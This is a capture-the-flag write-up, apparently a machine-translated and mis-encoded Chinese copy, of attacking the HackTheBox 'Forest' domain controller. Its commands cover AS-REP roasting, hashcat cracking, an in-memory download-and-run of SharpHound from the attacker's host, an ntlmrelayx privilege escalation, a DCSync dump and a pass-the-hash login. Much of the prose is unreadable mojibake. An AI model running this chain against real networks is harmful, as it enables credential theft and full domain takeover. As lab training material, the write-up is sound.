# é»‘å®¢ç›’å­â€”â€”æ£®æ—

> åŸæ–‡ï¼š<https://infosecwriteups.com/hackthebox-forest-5a11553de1?source=collection_archive---------1----------------------->

![](img/f3b089dc7fc0a24341d4ac9ba8e1bb69.png)

[https://www.hackthebox.eu/home/machines/profile/212](https://www.hackthebox.eu/home/machines/profile/212)

# TLï¼›é€Ÿåº¦ä¸‰è§’å½¢å®šä½æ³•(dead reckoning)

Forest åœ¨æˆ‘æœ€å–œæ¬¢çš„æœºå™¨åˆ—è¡¨ä¸­ã€‚å®ƒå‘æ‚¨å±•ç¤ºäº†ä¸åŒçš„å·¥å…·ï¼Œå¹¶æä¾›äº†æšä¸¾ã€äº¤äº’å’Œåˆ©ç”¨é€šå¸¸ä¸ Windows Active Directory ç›¸å…³çš„æœåŠ¡çš„å®é™…ç”¨æ³•ã€‚å®ƒé¦–å…ˆé€šè¿‡ RPC æšä¸¾ä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶åˆ©ç”¨ Kerberos é¢„æˆæƒæ¥è·å–ç”¨æˆ·çš„å¯†ç ã€‚ç„¶åï¼Œç”¨æˆ·å±äºä¸€ä¸ªå…è®¸ä»–å°†ç”¨æˆ·æ·»åŠ åˆ°â€œWindows Exchange æƒé™â€çš„ç»„ï¼Œè¯¥ç»„è¢«å…è®¸æ‰§è¡Œ DCSync æ”»å‡»ä»¥è·å–ç®¡ç†å‘˜å“ˆå¸Œã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¼šè¯•ç€ç”¨æœ€çŸ­å’Œæœ€æœ‰æ•ˆçš„æ–¹å¼è§£é‡Šä¸€äº›æ¦‚å¿µï¼Œè¿™äº›æ¦‚å¿µæ˜¯ä½ ç†è§£æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…æ‰€å¿…éœ€çš„ã€‚é¦–å…ˆï¼Œæˆ‘å°†å‘æ‚¨ä»‹ç»ä¸€ä¸‹ Active Directoryï¼Œå› ä¸ºè¿™ä¸ªç›’å­åœ¨æŸç§ç¨‹åº¦ä¸Šæ˜¯ Active Directory æ”»å‡»çš„é‡ç‚¹ï¼Œæ‰€ä»¥å¦‚æœæ‚¨ç†Ÿæ‚‰ AD å’Œ DC çš„æ¦‚å¿µï¼Œè¿™æ˜¯å€¼å¾—çš„ã€‚

# ä»€ä¹ˆæ˜¯ Active Directory æˆ– Active Directory ç›®å½•æœåŠ¡ï¼Ÿ

æ ¹æ® [Windows æ–‡æ¡£](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview):

> ç›®å½•æ˜¯å­˜å‚¨ç½‘ç»œä¸Šå¯¹è±¡ä¿¡æ¯çš„åˆ†å±‚ç»“æ„ã€‚ç›®å½•æœåŠ¡(å¦‚ Active Directory åŸŸæœåŠ¡(AD DS ))æä¾›äº†å­˜å‚¨ç›®å½•æ•°æ®å¹¶ä½¿è¿™äº›æ•°æ®å¯ä¾›ç½‘ç»œç”¨æˆ·å’Œç®¡ç†å‘˜ä½¿ç”¨çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒAD DS **å­˜å‚¨å…³äº**ç”¨æˆ·è´¦æˆ·**çš„ä¿¡æ¯**ï¼Œå¦‚**å§“åã€**ç”µè¯å·ç ç­‰ç­‰ï¼Œè€Œ**ä½¿åŒä¸€ç½‘ç»œä¸Šçš„å…¶ä»–æˆæƒç”¨æˆ·**èƒ½å¤Ÿè®¿é—®è¿™äº›ä¿¡æ¯ã€‚

å½“ AD DS å®‰è£…åœ¨ Windows æœåŠ¡å™¨ä¸Šæ—¶ï¼Œå®ƒé€šå¸¸ä¼šæˆä¸ºåŸŸæ§åˆ¶å™¨ã€‚[åŸŸæ§åˆ¶å™¨(DC)æ˜¯è¿è¡ŒæŸä¸ªç‰ˆæœ¬çš„ Windows Server æ“ä½œç³»ç»Ÿå¹¶å®‰è£…äº†æ´»åŠ¨ç›®å½•åŸŸæœåŠ¡çš„æœåŠ¡å™¨ã€‚](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc786438(v=ws.10)?redirectedfrom=MSDN)

# ä¾¦å¯Ÿ

æˆ‘é¦–å…ˆè¿è¡Œé»˜è®¤çš„ nmap æ‰«æï¼Œç›®æ ‡æ˜¯æšä¸¾æ­£åœ¨è¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬:

```
# nmap -sV -sC -oA nmap/initial 10.10.10.161
```

![](img/818a288308f425d8ae08019913f4b1b8.png)

åˆå§‹æ‰«æåï¼Œè®¸å¤šç«¯å£éƒ½æ˜¯å¼€æ”¾çš„ã€‚å› ä¸ºåƒè¿™æ ·çš„æœºå™¨é€šå¸¸æ¨¡æ‹Ÿä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œæ‰€ä»¥æˆ‘æ„Ÿå…´è¶£çš„æœåŠ¡æ˜¯ Kerberosã€RPCã€LDAP å’Œ SMBï¼Œå› ä¸ºè¿™äº›æœåŠ¡é€šå¸¸æä¾›å…³äºæœºå™¨ä¸­çš„ç”¨æˆ·å’Œç»„çš„å¤§é‡ä¿¡æ¯ã€‚è„šæœ¬ç»“æœè¿˜ç¡®å®šäº†ä»¥ä¸‹å†…å®¹:

*   è®¡ç®—æœºå:æ£®æ—
*   åŸŸå:htb.local
*   æ—å:htb.local
*   FQDN: FOREST.htb.local

æˆ‘è¿˜æ‰«æäº†æ‰€æœ‰çš„ TCP ç«¯å£:

```
# nmap -p- -oA nmap/allports-tcp 10.10.10.161
```

![](img/4054c06274e8a936f84ca64495ea5965.png)

é™¤äº†åˆå§‹æ‰«æä¹‹å¤–ï¼Œæˆ‘æ„Ÿå…´è¶£çš„æœåŠ¡æ˜¯ wsman(ç«¯å£ 5985)ã€‚è¿™æ„å‘³ç€æˆ‘å¯ä»¥â€œåƒ SSH ä¸€æ ·â€è¿æ¥åˆ°æœºå™¨å¹¶å»ºç«‹ä¼šè¯ã€‚æˆ‘ä¸ä¼šåˆ—ä¸¾ DNSï¼Œå› ä¸ºåŸŸæ§åˆ¶å™¨é€šå¸¸æ‰“å¼€ TCP 53ï¼Œå› ä¸ºå®ƒä»¬å……å½“åŸŸä¸­è®¡ç®—æœºçš„ DNS æœåŠ¡å™¨ã€‚

## æšä¸¾â€” RPC(ç«¯å£ 135)

æˆ‘ä½¿ç”¨ rpcclient é€šè¿‡ç©ºä¼šè¯è¿æ¥åˆ°æœåŠ¡ã€‚

![](img/93d62ac269045a9a7fe51b9b486289cc.png)

æˆ‘è°ƒç”¨å‘½ä»¤ *enumdomusers* ï¼Œå®ƒåˆ—å‡ºäº†æ‰€æœ‰çš„åŸŸç”¨æˆ·ã€‚

![](img/6697e95fa03bb4fd0c88f0e59cab7566.png)

æœ‰è¶£çš„ç”¨æˆ·æ˜¯ sebastienã€lucindaã€andyã€mark å’Œ santiã€‚å¸æˆ· Administratorã€Guest å’Œ krbtgt æ˜¯ Windows æœåŠ¡å™¨ä¸­çš„é»˜è®¤å¸æˆ·ã€‚æˆ‘å¤„ç†è¾“å‡ºå¹¶å°†å…¶ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­:

```
# cat users.list | cut -d "[" -f 2 | cut -d "]" -f 1 > users.list
```

æˆ‘è¿˜è¿è¡Œäº† *enumdomgroups* å‘½ä»¤ï¼Œå‘ç°äº†ä¸¤ä¸ªæœ‰è¶£çš„ç»„:

![](img/a10a59a0d9d11910d2b962ca366e1446.png)

## æšä¸¾â€” LDAP(ç«¯å£ 389)

æ‚¨å¯ä»¥é€šè¿‡ LDAP æŸ¥è¯¢åŸŸæ§åˆ¶å™¨ã€‚æšä¸¾ LDAP çš„ä¸€ä¸ªå¥½æ–¹æ³•æ˜¯ä½¿ç”¨ LDAP çš„ nmap è„šæœ¬ã€‚

```
# ls /usr/share/nmap/scripts/| grep ldap ldap-brute.nse
ldap-novell-getpass.nse
ldap-rootdse.nse
ldap-search.nse
```

åœ¨æ‰€æœ‰çš„è„šæœ¬ä¸­ï¼Œå¯¹æˆ‘æœ€æœ‰ç”¨çš„æ˜¯ ldap-search:

```
# nmap -p 389 --script ldap-search 10.10.10.161
```

![](img/b3d9c851bfd6b5a19bf6f5f35dc87cb0.png)

è¢«è°ƒç”¨å‘½ä»¤çš„ç»“æœè¯´æ˜äº†è¯¥åŸŸçš„å¾ˆå¤šæƒ…å†µã€‚è®©æˆ‘å°è±¡æ·±åˆ»çš„æ˜¯ï¼Œå¾ˆå¤š CN éƒ½æ˜¯å…³äºå¾®è½¯çš„é‚®ä»¶æœåŠ¡ Exchange çš„ã€‚

## æšä¸¾â€” SMB(ç«¯å£ 445)

æˆ‘æ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨ç©ºä¼šè¯è¿æ¥ï¼Œå¹¶å¯èƒ½åˆ—å‡ºå…±äº«æˆ–æ–‡ä»¶ã€‚æˆ‘ä½¿ç”¨ smbmap æ¥å®ç°è¿™ä¸€ç‚¹:

![](img/7319bf2ae70ff15d45300349726735ab.png)

æˆ‘è¢«æ‹’ç»äº†ã€‚æˆ‘å°è¯•äº†å…¶ä»–åŸºæœ¬å‡­è¯ï¼Œä½†å®ƒä»¬ä¸èµ·ä½œç”¨ã€‚

# åˆå§‹è®¿é—®â€”ç”¨æˆ·

## ç ·ç„™çƒ§

åœ¨å°è¯•äº†å¾ˆå¤šä¸œè¥¿ä¹‹åï¼Œæˆ‘åœ¨æ¢ç´¢å¯¹ Kerberoast(ç«¯å£ 88)çš„æ”»å‡»æ—¶é‡åˆ°äº† AS-REP çƒ˜çƒ¤ã€‚å‡ ä¹æ‰€æœ‰çš„æ”»å‡»éƒ½éœ€è¦åŸŸçš„æœ‰æ•ˆç”¨æˆ·åå’Œå¯†ç ï¼Œåªæœ‰ä¸€ç§æŠ€æœ¯ä¾‹å¤–ã€‚

ä»£ç†çƒ˜çƒ¤æ˜¯å¯¹ Kerberos çš„ä¸€ç§æ”»å‡»ï¼Œåœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ç”±æœªå¯ç”¨é¢„éªŒè¯çš„ç”¨æˆ·åŠ å¯†çš„æ•°æ®ã€‚é¢„èº«ä»½éªŒè¯å‘ç”Ÿåœ¨ Kerberos èº«ä»½éªŒè¯æœŸé—´ï¼Œæ˜¯ç¬¬ä¸€æ­¥ã€‚Kerberoast æ˜¯ Windows é™¤ NTLM ä¹‹å¤–çš„èº«ä»½éªŒè¯æœºåˆ¶ã€‚åŸŸæ§åˆ¶å™¨é€šå¸¸æ˜¯ KDCã€‚æˆ‘å»ºè®®æ‚¨ç ”ç©¶ Kerberos æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä½†è¿™å¹¶ä¸æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜æ‰€å¿…éœ€çš„ã€‚

å¦‚æœå¯ç”¨äº†é¢„èº«ä»½éªŒè¯:

*   ç”¨æˆ·å°†æ—¶é—´æˆ³(AS-REQ)å‘é€åˆ°åŸŸæ§åˆ¶å™¨ï¼Œè¯¥æ—¶é—´æˆ³ç”±ç”¨æˆ·çš„æ•£åˆ—åŠ å¯†ã€‚
*   åŸŸæ§åˆ¶å™¨ä½¿ç”¨ç”¨æˆ·çš„æ•£åˆ—å¯¹å…¶è¿›è¡Œè§£å¯†(å› ä¸º DC æ‹¥æœ‰åŸŸä¸­å¸æˆ·çš„æ‰€æœ‰æ•£åˆ—çš„å‰¯æœ¬),å¹¶æ£€æŸ¥æ—¶é—´æˆ³æ˜¯å¦åœ¨å…¶æ—¶é—´çš„ 5 åˆ†é’Ÿå†…ã€‚ä¸ºäº†ä½¿ Kerberoast èº«ä»½éªŒè¯æ­£å¸¸å·¥ä½œï¼Œè¯·æ±‚è€…å’Œ DC çš„æ—¶é—´å·®åº”è¯¥åœ¨ 5 åˆ†é’Ÿä»¥å†…ã€‚
*   å¦‚æœæ˜¯ï¼Œå®ƒå°†å‘é€ä¸€ä¸ª AS-REPï¼Œå¹¶ç»§ç»­è¿›è¡Œ Kerberoast è®¤è¯çš„ä¸‹ä¸€æ­¥ï¼Œæˆ‘å°†ä¸åœ¨æœ¬æ–‡ä¸­è®¨è®ºï¼Œå› ä¸ºå®ƒä¸éœ€è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚

å¦‚æœé¢„èº«ä»½éªŒè¯è¢«ç¦ç”¨:

*   ä»»ä½•äººéƒ½å¯ä»¥è¯·æ±‚ä»»ä½•æœ‰æ•ˆç”¨æˆ·çš„ä¿¡æ¯ï¼ŒDC ä¼šå‘æ‚¨å‘é€ç”±ç”¨æˆ·å¯†ç åŠ å¯†çš„æ•°æ®(AS-REP ),æ‚¨å¯ä»¥ç¦»çº¿ç ´è§£ã€‚
*   è¯·æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œé¢„èº«ä»½éªŒè¯æ˜¯å¯ç”¨çš„ï¼Œä½†å¯ä»¥ç”±ç”¨æˆ·å¸æˆ·ä¿®æ”¹ã€‚

æ‰€ä»¥æˆ‘åœ¨è¿™é‡Œè¯•å›¾åˆ©ç”¨çš„æ˜¯ Kerberos çš„é¢„è®¤è¯éƒ¨åˆ†ï¼Œå› æ­¤è¿™ç§æ”»å‡»è¢«ç§°ä¸º AS-REP çƒ˜çƒ¤(å› ä¸ºæ”»å‡»çš„ç›®çš„æ˜¯ç ´è§£ AS-REP)ã€‚ç„¶åï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ [Impacket](https://github.com/SecureAuthCorp/impacket) çš„ GetNPUsers ä¸ºæ‰¾åˆ°çš„ç”¨æˆ·åè¯·æ±‚æ•°æ®ï¼Œå¸Œæœ›æŸä¸ªå¸æˆ·å·²ç»ç¦ç”¨äº†é¢„æˆæƒã€‚æˆ‘è¯·æ±‚:

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile users.list
```

ç»“æœæ˜¾ç¤ºæˆ‘èƒ½å¤Ÿè·å¾—ä¸€ä¸ª AS-REPã€‚è¿™æ„å‘³ç€ç”¨æˆ· svc-alfresco ç¦ç”¨äº† PREAUTHã€‚

![](img/2365dfe6c0e2d53e4ebff9adcad52dce.png)

æ³¨æ„ï¼Œæ¯æ¬¡è¿è¡Œ GetNPUsers æ—¶ï¼Œæ‚¨å°†è·å¾—ä¸åŒçš„ AS-REP(å› ä¸ºè¢«è¯·æ±‚çš„æ•°æ®æ˜¯ä¸åŒçš„)ï¼Œä½†æ˜¯ç›¸åŒçš„å¯†ç å°†è¢«ç ´è§£ã€‚ç„¶åæˆ‘å¯ä»¥ä½¿ç”¨ hashcat ç ´è§£ç”¨æˆ·çš„å¯†ç ã€‚

```
# hashcat -m 18200 hashfile wordlist
```

æ³¨æ„ï¼Œmode æ˜¯ 18200(å¦‚æœæ‚¨æŸ¥æ‰¾ hashcat çš„ç¤ºä¾‹æ•£åˆ—ï¼Œæ‚¨ä¼šå‘ç°è¿™æ˜¯é’ˆå¯¹ Kerberos 5 AS-REP etype 23 ç±»å‹çš„ã€‚â€œetypeâ€æˆ‘è®¤ä¸ºæ˜¯åŠ å¯†ç±»å‹ï¼Œä¹Ÿå°±æ˜¯ RC4-HMACã€‚

![](img/f9f7f1d5c8cba75bea05d2368f1dee33.png)

å¸æˆ· svc-alfresco çš„å¯†ç æ˜¯â€œs3r serviceâ€ã€‚

## è·å–ç”¨æˆ·:

ç”±äºç«¯å£ 5985 æ˜¯å¼€æ”¾çš„ï¼Œæˆ‘ä½¿ç”¨ [evil-winrm](https://github.com/Hackplayers/evil-winrm) è¿æ¥åˆ°æœºå™¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Powershell çš„ Enter-PSSession æˆ–å…¶ä»– cmdlets æ¥å®Œæˆæ­¤æ“ä½œã€‚æˆ‘è¯·æ±‚:

```
evil-winrm -u svc-alfresco -p 's3rvice' -i 10.10.10.161
```

å‡­è¯æœ‰æ•ˆã€‚

![](img/fd019a7e2cc80c9e6261bca329a9c297.png)

ç„¶åï¼Œæˆ‘åˆ—å‡ºäº† C:\users ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶å‘ç°æˆ‘å¯ä»¥è®¿é—® user.txt:

![](img/c4025680355221dbdec4f49c33e555c1.png)

# SVC-æˆ·å¤–â†’ç®¡ç†å‘˜

ç„¶åï¼Œæˆ‘è¿è¡Œ *whoami /all* æ¥æ£€æŸ¥æˆ‘æ‰€å±çš„ç»„:

![](img/26eef43a5cdc71ca0296f7a84d9f7b79.png)

æˆ‘å‘ç°æˆ‘å±äºç‰¹æƒ IT å¸æˆ·å’ŒæœåŠ¡å¸æˆ·ç»„(æç¤ºæ˜¯ç”¨æˆ·åä»¥ svc å¼€å¤´)ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œæˆ‘ç„¶åä½¿ç”¨ [BloodHound](https://github.com/BloodHoundAD/BloodHound) (å½“æˆ‘è§£å†³è¿™å°æœºå™¨æ—¶ï¼ŒBloodhound 3 å°šæœªå‘å¸ƒ)æ¥è‡ªåŠ¨è·å–å…³äºåŸŸçš„ä¿¡æ¯ã€‚

## å¤§çŒçŠ¬

Bloodhound æ˜¯ä¸€ä¸ª GUI å·¥å…·ï¼Œå®ƒä½¿ç”¨ neo4j ä½œä¸ºå…¶æ•°æ®åº“ç®¡ç†ã€‚åŸºæœ¬ä¸Šï¼Œä¸€ä¸ª ingestor æ”¶é›†äº†å…³äºåŸŸçš„å¤§é‡ä¿¡æ¯ï¼Œå°†å®ƒä»¬å­˜å‚¨åœ¨å¤§é‡ json æ–‡ä»¶ä¸­ï¼Œç”± BloodHound ä¸ºæ‚¨å¤„ç†ã€‚è¿™ç¯‡æ–‡ç« ä¸æ˜¯å…³äºå¦‚ä½•ç»è¥çŒçŠ¬ã€‚æˆ‘é¦–å…ˆä½¿ç”¨ SharpHound æ”¶é›†å…³äºåŸŸçš„ä¿¡æ¯ã€‚

æˆ‘è®¾ç½®äº†ä¸€ä¸ª python http æœåŠ¡å™¨æ¥æœåŠ¡ SharpHound.ps1ï¼Œå¹¶åœ¨æœºå™¨çš„å†…å­˜ä¸Šè¿è¡Œå®ƒï¼Œç„¶åè¿è¡Œ Invoke-BloodHound:

```
PS > iex(new-object net.webclient).downloadString('[http://myvpnip/SharpHound.ps1'](http://10.10.14.4/SharpHound.ps1')); Invoke-BloodHound -Collect
ionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
```

æ”¶é›†çš„æ•°æ®å°†å­˜å‚¨åœ¨ ZIP æ–‡ä»¶ä¸­:

![](img/8b1b133b37fcc177b83321ccc5d7fdf9.png)

ç„¶åï¼Œæˆ‘ä½¿ç”¨ SMB é€šè¿‡ impacket ä¸­çš„ smbserver è„šæœ¬å°†æ–‡ä»¶ä¼ è¾“åˆ°æˆ‘çš„æœºå™¨ä¸Š:

```
smbserver.py -smb2support -username sifo -password sifo smb smb/
```

å°†å®ƒä¼ è¾“åˆ°æˆ‘çš„æœ¬åœ°è®¡ç®—æœº:

![](img/9edeaa75ec08c5ec67c5101a7f11306f.png)![](img/0a8865b5dd501d19f2714af66a6d49fb.png)

æˆ‘åªæ˜¯å°† ZIP æ–‡ä»¶æ‹–åˆ° BloodHoundï¼Œå¹¶é€‰æ‹©æŸ¥è¯¢â€œæŸ¥æ‰¾åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„â€:

![](img/f1c41979510e5449300bceba1431638a.png)

æˆ‘å¯ä»¥çœ‹åˆ° svc-alfresco æ˜¯æœåŠ¡å¸æˆ·çš„æˆå‘˜ï¼Œè¿™æ˜¯ç‰¹æƒ IT å¸æˆ·çš„æˆå‘˜ã€‚ç‰¹æƒ IT å¸æˆ·æ˜¯å¸æˆ·æ“ä½œå‘˜çš„æˆå‘˜ã€‚Account Operators æ‹¥æœ‰å¯¹ Exchange Windows æƒé™çš„ä¸€èˆ¬(å³å®Œå…¨å¯¹è±¡æ§åˆ¶ï¼Œå³æˆ‘å¯ä»¥æ·»åŠ ç”¨æˆ·)è®¿é—®æƒé™ã€‚Exchange Windows æƒé™å…·æœ‰å¯¹åŸŸ HTB.LOCAL çš„ WriteDACL(è¿™æ„å‘³ç€ï¼Œæˆ‘å¯èƒ½ä¼šæˆäºˆè‡ªå·±æ‰§è¡Œ DCSync æ”»å‡»çš„æƒé™)ã€‚åœ¨é˜…è¯»äº†æœ‰å…³æˆ‘å¦‚ä½•æ»¥ç”¨å‘ Exchange Windows æƒé™æ·»åŠ ç”¨æˆ·çš„èƒ½åŠ›çš„æ›´å¤šä¿¡æ¯åï¼Œæˆ‘çœ‹åˆ°äº†è¿™ç¯‡æ–‡ç« :

[](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/) [## ä½¿ç”¨ Active Directory ä¸­çš„ ACL æå‡æƒé™

### ç”± Rindert Kramer å’Œ Dirk-jan Mollema åœ¨å†…éƒ¨æ¸—é€æµ‹è¯•ä¸­ç ”ç©¶å’Œç¼–å†™çš„ä»‹ç»ï¼Œå®ƒâ€¦

blog.fox-it.com](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/) 

## DCSync æ”»å‡»:

åŸŸæ§åˆ¶å™¨å¯ä»¥åœ¨ä¸€ä¸ªåŸŸä¸­å…±å­˜ã€‚ç„¶åï¼ŒåŸŸæ§åˆ¶å™¨é€šè¿‡ä¸åŸŸä¸­çš„å…¶ä»–åŸŸæ§åˆ¶å™¨åŒæ­¥æ¥æ‰§è¡Œå¤‡ä»½ã€‚å¦‚æœç”¨æˆ·å¯ä»¥åœ¨åŸŸä¸Šæ‹¥æœ‰å¤åˆ¶-è·å–-æ›´æ”¹-æ‰€æœ‰æƒé™ï¼Œè¿™å¯èƒ½ä¼šè¢«æ»¥ç”¨ã€‚ç„¶åï¼Œæˆ‘å¯ä»¥æ¬ºéª—ä»»ä½•åŸŸæ§åˆ¶å™¨å°†å…¶å¯†ç å“ˆå¸Œæ•°æ®åº“â€œåŒæ­¥â€ç»™æˆ‘ã€‚

æ ¹æ®ä¸Šé¢æåˆ°çš„æ–‡ç« ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬æœ‰æƒè®¿é—®çš„ç”¨æˆ·çš„ ACL ä»¥è¢«æˆäºˆå¤åˆ¶æƒé™ï¼Œåˆ™å¯ä»¥æ‰§è¡Œç§°ä¸ºâ€œACL æ”»å‡»â€çš„ç¬¬ä¸€ç§æ”»å‡»ã€‚

æˆ‘é¦–å…ˆè°ƒç”¨ Get-ADGroupMember æ¥æ£€æŸ¥â€œExchange Windows æƒé™â€ç»„çš„æˆå‘˜:

![](img/7cedc6b73260204e4f75908b4dbc6816.png)

ä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œ DCSync æ”»å‡»ï¼Œæˆ‘é¦–å…ˆåœ¨â€œExchange Windows æƒé™â€ç»„ä¸­æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘å†³å®šåªæ·»åŠ  svc-alfrescoã€‚

```
PS > Add-AdGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
```

å†æ¬¡è¿è¡Œ Get-ADGroupMemberï¼Œæˆ‘å‘ç° svc-alfresco ç°åœ¨æ˜¯ä¸€ä¸ªæˆå‘˜:

![](img/bcf05578c22a0bb68d227ddfaa4f376f.png)

ç„¶åï¼Œæˆ‘å°† ntlmrelay.py ä» Impacket è®¾ç½®ä¸ºä¸­ç»§åˆ° LDAPï¼Œå¹¶å°†ç”¨æˆ· svc-alfresco å‡çº§ä¸ºå¤åˆ¶ç‰¹æƒã€‚

```
ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
```

ç”±äºæˆ‘å¯ä»¥å°†ç”¨æˆ·æ”¾å…¥â€œExchange Windows Permissionsâ€ç»„ï¼Œå¦‚æœæˆ‘é€šè¿‡è®¿é—® http://localhost/privexchange(ä»»ä½•ç›®å½•éƒ½å¯ä»¥ï¼Œè¿™æ˜¯éšæœºçš„)å¹¶ä½¿ç”¨ svc-alfresco çš„å‡­æ®è¿›è¡Œèº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥å‡çº§ä¸ºåŸŸç®¡ç†å‘˜(å¯¹åŸŸæ‹¥æœ‰æ§åˆ¶æƒï¼Œè¿™æ„å‘³ç€æˆ‘å¯ä»¥è®¿é—®æ‰€æœ‰å“ˆå¸Œï¼ŒåŒ…æ‹¬ç®¡ç†å‘˜å“ˆå¸Œ)ã€‚

![](img/2ee5afb3bbc2c2a205d4134ae82c1283.png)

æ—¢ç„¶ svc-alfresco æ˜¯åŸŸç®¡ç†å‘˜ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ä½¿ç”¨ Impacket çš„ secretsdump.py æ¥æ‰§è¡Œ DCSync æ”»å‡»ï¼Œæ”¶é›†æ‰€æœ‰ç”¨æˆ·æ•£åˆ—:

```
# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc -outputfile secrets-dump.txt
```

æˆ‘å¾—åˆ°äº†å“ˆå¸Œå€¼:

![](img/10f7d64125cad493535bfff690ed527e.png)

ç°åœ¨æˆ‘å·²ç»æœ‰äº†ç®¡ç†å‘˜æ•£åˆ—ï¼Œæˆ‘ä½¿ç”¨ evil-winrm ä¸æœºå™¨å»ºç«‹ä¸€ä¸ªä¼šè¯:

```
evil-winrm -u Administrator -i 10.10.10.161 -H '32693b11e6aa90eb43d32c72a07ceea6'
```

åˆ—å‡ºæ¡Œé¢ä¸­çš„æ–‡ä»¶ï¼Œæˆ‘ç°åœ¨å¯ä»¥è¯»å– root.txtã€‚

![](img/6f1ccaee4abf65bb84ef2f67fb3e9151.png)

è¿™å°±æ˜¯æˆ‘å¦‚ä½•ä»é»‘å®¢ç›’å­ä¸­è§£å†³æ£®æ—é—®é¢˜çš„ï¼è¿™æ˜¯ä¸€ä¸ªå¯æ€•çš„æ—…ç¨‹ï¼Œä½†ç»å¯¹å€¼å¾—ï¼æ„Ÿè°¢é˜…è¯»ï¼ğŸº

*å…³æ³¨* [*Infosec æŠ¥é“*](https://medium.com/bugbountywriteup) *è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚*

[](https://medium.com/bugbountywriteup) [## ä¿¡æ¯å®‰å…¨æŠ¥é“

### æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä» bug å¥–é‡‘å’Œ CTF åˆ° vulnhubâ€¦

medium.com](https://medium.com/bugbountywriteup)